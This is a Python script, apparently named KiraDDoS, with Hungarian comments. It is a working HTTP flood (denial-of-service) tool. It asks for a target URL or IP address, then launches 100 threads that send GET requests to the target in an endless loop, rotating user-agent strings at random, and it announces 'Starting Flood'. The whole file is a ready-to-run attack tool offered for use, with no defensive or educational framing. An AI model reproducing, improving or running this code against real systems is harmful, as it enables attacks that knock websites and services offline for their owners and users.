import requests
import threading
import random
import os
from colorama import Fore, Style, init

# Inicializálás a színekhez
init(autoreset=True)

# --- KONFIGURÁCIÓ ---
TIMEOUT = 5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    # Az ASCII art fehér színben
    banner = f"""{Fore.WHITE}
    /$$   /$$ /$$                    /$$$$$$$  /$$$$$$$             /$$$$$$
    | $$  /$$/|__/                   | $$__  $$| $$__  $$           /$$__  $$
    | $$ /$$/  /$$  /$$$$$$  /$$$$$$ | $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/
    | $$$$$/  | $$ /$$__  $$|____  $$| $$  | $$| $$  | $$ /$$__  $$|  $$$$$$
    | $$  $$  | $$| $$  \__/ /$$$$$$$| $$  | $$| $$  | $$| $$  \ $$ \____  $$
    | $$\  $$ | $$| $$      /$$__  $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
    | $$ \  $$| $$| $$     |  $$$$$$$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
    |__/  \__/|__/|__/      \_______/|_______/ |_______/  \______/  \______/

                                    Author : Mixyy2000
    """
    print(banner)

def attack(target_input):
    # target_input az az IP/URL, amit a felhasználó beírt
    while True:
        try:
            # A kéréshez kell az http:// de a kiírásnál csak az IP-t látjuk
            full_url = target_input if target_input.startswith("http") else "http://" + target_input
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.get(full_url, headers=headers, timeout=TIMEOUT)

            if response.status_code == 200:
                # Zöld színben a siker, és konkrétan "IP" szót használunk
                print(f"{Fore.GREEN}[+] Request sent to : {target_input}")
            else:
                # Sárga színben a részleges hiba
                print(f"{Fore.YELLOW}[!] Request failed IP: {target_input} --> Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            # Piros színben a teljes hiba
            print(f"{Fore.RED}[- ] Request failed IP: {target_input} --> {e}")

def main():
    print_banner()
    target = input(f"{Fore.WHITE}Enter an URL or IP Adress --> ")

    print(f"{Fore.BLUE}Starting Flood... Target: {target}\n")

    # Szálak (Threads) a gyorsaságért (~10000 req/s)
    for i in range(100):
        t = threading.Thread(target=attack, args=(target,))
        t.start()

if __name__ == "__main__":
    # Telepítés: pip install requests colorama
    main()